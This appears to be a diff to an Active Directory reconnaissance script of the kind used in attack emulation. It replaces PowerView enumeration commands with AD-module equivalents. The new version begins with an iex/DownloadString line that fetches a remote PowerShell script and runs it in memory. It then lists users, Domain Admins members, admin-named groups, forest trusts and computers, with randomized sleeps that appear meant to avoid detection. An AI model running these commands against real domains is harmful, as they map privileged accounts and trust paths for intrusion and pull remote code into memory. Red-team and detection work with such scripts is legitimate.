@@ -1,17 +1,15 @@
-Get-Domain
-Get-DomainSID
-Get-DomainPolicyData
-Get-DomainController
-Start-Sleep -Seconds 278
-Get-DomainUser | select -ExpandProperty samaccountname
-Get-DomainUser -Properties samaccountname,logonCount
-Get-DomainGroup | select name
-Get-DomainGroupMember -Identity "Domain Admins"
-Start-Sleep -Seconds 359
-Get-DomainComputer | select Name
-Get-DomainOU | select name
-Get-ForestDomain -Verbose
-Get-DomainTrust
-Start-Sleep -Seconds 319
-Get-DomainComputer -UnConstrained
-Get-DomainUser -TrustedToAuth
+iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
+Get-ADDomain
+(Get-ADDomain).DomainSID
+Get-ADDomainController
+Get-ADUser -Filter * -Properties *
+Get-AdUser -Filter * -Properties * | Select Name, logonCount
+get-ADUser -Filter 'Description -like "*built*"' -properties description | select name, description
+Get-ADGroupMember -Identity "Domain Admins" -Recursive
+Start-Sleep (Get-Random -min 60 -max 120)
+Get-ADComputer -Filter * | select Name
+Get-ADGroup -Filter * | select name
+Get-ADGroup -Filter 'Name -like "*admin*"' | select Name
+Get-ADForest
+Get-ADTrust
+Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
